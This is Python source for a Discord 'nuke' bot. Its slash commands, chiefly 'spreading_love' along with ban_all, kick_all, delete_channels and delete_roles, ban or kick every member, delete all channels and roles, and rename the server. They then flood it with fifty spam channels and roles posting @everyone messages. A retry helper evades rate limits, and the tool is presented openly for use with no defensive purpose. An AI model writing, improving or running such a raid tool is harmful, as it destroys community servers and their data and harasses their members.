import os
import asyncio
import discord
from colorama import Fore, init
import json
import sys

# Print Pycord version for debugging
print(f"Pycord version: {discord.__version__}")

# Initialize colorama
init()

# Load configuration
try:
    with open('config.json', encoding='utf-8') as config:
        setup = json.load(config)
except FileNotFoundError:
    print(f"{Fore.RED}Error: config.json not found! Please create a config.json file with the required settings.{Fore.RESET}")
    print(f"{Fore.YELLOW}Example config.json:{Fore.RESET}")
    print('{\n    "bot_token": "YOUR_BOT_TOKEN_HERE",\n    "prefix": "!",\n    "channelnames": "ราชาแฮกเกอร์ตัวจริงมาแล้ววว",\n    "rolenames": "โนวันอิสเฮีย",\n    "spam_text": "@everyone I L0ovE LOVE TAST3 https://tenor.com/view/yabujin-pnkware-umilgang-1616-claws-gif-5298462550873508806"\n}')
    sys.exit(1)

token = setup.get('bot_token')
if not token or not isinstance(token, str):
    print(f"{Fore.RED}Error: Invalid or missing bot_token in config.json!{Fore.RESET}")
    sys.exit(1)

prefix = setup.get('prefix', '!')
namesforchannel = setup.get('channelnames', 'ราชาแฮกเกอร์ตัวจริงมาแล้ววว')
namesforroles = setup.get('rolenames', 'โนวันอิสเฮีย')
spam_text_full = setup.get('spam_text', '@everyone I L0ovE LOVE TAST3 https://tenor.com/view/yabujin-pnkware-umilgang-1616-claws-gif-5298462550873508806')

# Parse spam text
spam_text_parts = spam_text_full.split()
spam_text = ' '.join(spam_text_parts[:-1]) if len(spam_text_parts) > 1 else spam_text_full
spam_url = spam_text_parts[-1] if len(spam_text_parts) > 1 else ''

if not isinstance(spam_text, str) or not spam_text:
    print(f"{Fore.RED}Error: Invalid spam_text! Using default.{Fore.RESET}")
    spam_text = "@everyone I L0ovE LOVE TAST3"
    spam_url = ""

# Set up intents
intents = discord.Intents.default()
intents.members = True
intents.presences = True
intents.message_content = True

# Initialize bot
bot = discord.Bot(intents=intents)

# Console setup
def axeop():
    os.system('title THis iSA BOt Forr funn!!!11' if os.name == 'nt' else 'clear')
    print(f"{Fore.LIGHTCYAN_EX} CAn Y0u fE3l th1s Lov03 taste? {Fore.RESET}")

# Bot startup
@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="LOVE L0VE TAST3"))
    axeop()
    print(f"{Fore.MAGENTA}░█─── █▀▀█ ▀█─█▀ ░█▀▀▀   ▀▀█▀▀ ─█▀▀█ ░█▀▀▀█ ▀▀█▀▀ █▀▀█{Fore.RESET}")
    print(f"{Fore.MAGENTA}░█─── █▄▀█ ─█▄█─ ░█▀▀▀   ──█── ░█▄▄█ ─▀▀▀▄▄ ─░█── ──▀▄{Fore.RESET}")
    print(f"{Fore.MAGENTA}░█▄▄█ █▄▄█ ──▀── ░█▄▄▄   ──▀── ░█─░█ ░█▄▄▄█ ─░█── █▄▄█{Fore.RESET}")
    print(f"{Fore.GREEN}Bot is online as {bot.user}!{Fore.RESET}")
    print(f"{Fore.YELLOW}Guilds: {[guild.id for guild in bot.guilds]}{Fore.RESET}")
    print(f"{Fore.YELLOW}Syncing slash commands globally...{Fore.RESET}")
    try:
        await bot.sync_commands()
        print(f"{Fore.GREEN}Slash commands synced successfully!{Fore.RESET}")
        registered_commands = [cmd.name for cmd in bot.commands]
        print(f"{Fore.YELLOW}Registered commands: {registered_commands}{Fore.RESET}")
    except discord.HTTPException as e:
        print(f"{Fore.RED}Sync failed: {e.status} - {e.text}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}Unexpected sync error: {e}{Fore.RESET}")
    print(f"{Fore.YELLOW}Spam text: '{spam_text}', URL: '{spam_url}'{Fore.RESET}")


# Retry function
async def execute_with_retry(action, max_retries=3):
    for attempt in range(max_retries):
        try:
            await action()
            return True
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after or 1.0
                print(f"{Fore.YELLOW}Rate limited, retrying in {retry_after}s...{Fore.RESET}")
                await asyncio.sleep(retry_after)
            else:
                print(f"{Fore.RED}Error: {e.status} - {e.text}{Fore.RESET}")
                return False
        except Exception as e:
            print(f"{Fore.RED}Unexpected error: {e}{Fore.RESET}")
            return False
    print(f"{Fore.RED}Failed after {max_retries} retries{Fore.RESET}")
    return False

# Slash command: Ping
@bot.slash_command(name="ping", description="Sends the bot's latency.")
async def ping(ctx):
    await ctx.respond(f"Pong! Latency is {bot.latency * 1000:.2f}ms")

# Slash command: Spreading Love (Nuke)
@bot.slash_command(name="spreading_love", description="แจกจ่ายความรัก :3 (ban users, delete channels/roles, spam, and rename guild)")
async def spreading_love(ctx):
    await ctx.defer()
    guild = ctx.guild
    try:
        for user in guild.members:
            await execute_with_retry(lambda: user.ban(reason="I L0ovE LOVE TAST3"))
            print(f"{Fore.LIGHTCYAN_EX}Banned {user.name}{Fore.RESET}")
            await asyncio.sleep(0.01)
        for channel in guild.channels:
            await execute_with_retry(lambda: channel.delete())
            print(f"{Fore.LIGHTCYAN_EX}Deleted {channel.name}{Fore.RESET}")
            await asyncio.sleep(0.01)
        for channel in guild.channels:
            for _ in range(2):
                await channel.send(spam_text)
                print(f"{Fore.LIGHTCYAN_EX}Spammed '{spam_text}' in {channel.name}{Fore.RESET}")
                if spam_url:
                    await channel.send(spam_url)
                    print(f"{Fore.LIGHTCYAN_EX}Spammed URL in {channel.name}{Fore.RESET}")
                await asyncio.sleep(0.01)
        for role in guild.roles:
            await execute_with_retry(lambda: role.delete())
            print(f"{Fore.LIGHTCYAN_EX}Deleted role {role.name}{Fore.RESET}")
            await asyncio.sleep(0.01)
        await execute_with_retry(lambda: guild.edit(
            name="โดนกำจัดโดยเฮนมิจัง :3", description="I L0ovE LOVE TAST3",
            reason="I L0ovE LOVE TAST3", icon=None, banner=None
        ))
        print(f"{Fore.LIGHTCYAN_EX}Guild edited{Fore.RESET}")
        for _ in range(50):
            new_channel = await guild.create_text_channel(name=namesforchannel)
            print(f"{Fore.LIGHTCYAN_EX}Created {namesforchannel}{Fore.RESET}")
            for _ in range(2):
                await new_channel.send(spam_text)
                if spam_url:
                    await new_channel.send(spam_url)
                await asyncio.sleep(0.01)
            await guild.create_role(name=namesforroles, color=discord.Color.random())
            print(f"{Fore.LIGHTCYAN_EX}Created role {namesforroles}{Fore.RESET}")
            await asyncio.sleep(0.01)
        await ctx.followup.send("Nuke completed!")
    except Exception as e:
        print(f"{Fore.RED}Nuke failed: {e}{Fore.RESET}")
        await ctx.followup.send(f"Nuke failed: {e}")

# Slash command: Ban All
@bot.slash_command(name="ban_all", description="Ban all members in the server")
async def ban_all(ctx):
    await ctx.defer()
    guild = ctx.guild
    for user in guild.members:
        await execute_with_retry(lambda: user.ban(reason="I L0ovE LOVE TAST3"))
        print(f"{Fore.LIGHTCYAN_EX}Banned {user.name}{Fore.RESET}")
        await asyncio.sleep(0.01)
    await ctx.followup.send("Mass ban done!")

# Slash command: Kick All
@bot.slash_command(name="kick_all", description="Kick all members in the server")
async def kick_all(ctx):
    await ctx.defer()
    guild = ctx.guild
    for user in guild.members:
        await execute_with_retry(lambda: user.kick(reason="I L0ovE LOVE TAST3"))
        print(f"{Fore.LIGHTCYAN_EX}Kicked {user.name}{Fore.RESET}")
        await asyncio.sleep(0.01)
    await ctx.followup.send("Mass kick done!")

# Slash command: Delete Channels
@bot.slash_command(name="delete_channels", description="Delete all channels in the server")
async def delete_channels(ctx):
    await ctx.defer()
    guild = ctx.guild
    for channel in guild.channels:
        await execute_with_retry(lambda: channel.delete())
        print(f"{Fore.LIGHTCYAN_EX}Deleted {channel.name}{Fore.RESET}")
        await asyncio.sleep(0.01)
    await ctx.followup.send("Channels deleted!")

# Slash command: Delete Roles
@bot.slash_command(name="delete_roles", description="Delete all roles in the server")
async def delete_roles(ctx):
    await ctx.defer()
    guild = ctx.guild
    for role in guild.roles:
        await execute_with_retry(lambda: role.delete())
        print(f"{Fore.LIGHTCYAN_EX}Deleted role {role.name}{Fore.RESET}")
        await asyncio.sleep(0.01)
    await ctx.followup.send("Roles deleted!")

# Slash command: Custom Message
@bot.slash_command(name="custom_message", description="Send a custom message")
async def custom_message(ctx):
    await ctx.defer()
    await ctx.followup.send(spam_text_full)

# Error handler
@bot.event
async def on_command_error(ctx, error):
    print(f"{Fore.RED}Error: {error}{Fore.RESET}")
    await ctx.respond(f"Error: {error}", ephemeral=True)

# Run the bot
if __name__ == "__main__":
    bot.run(token)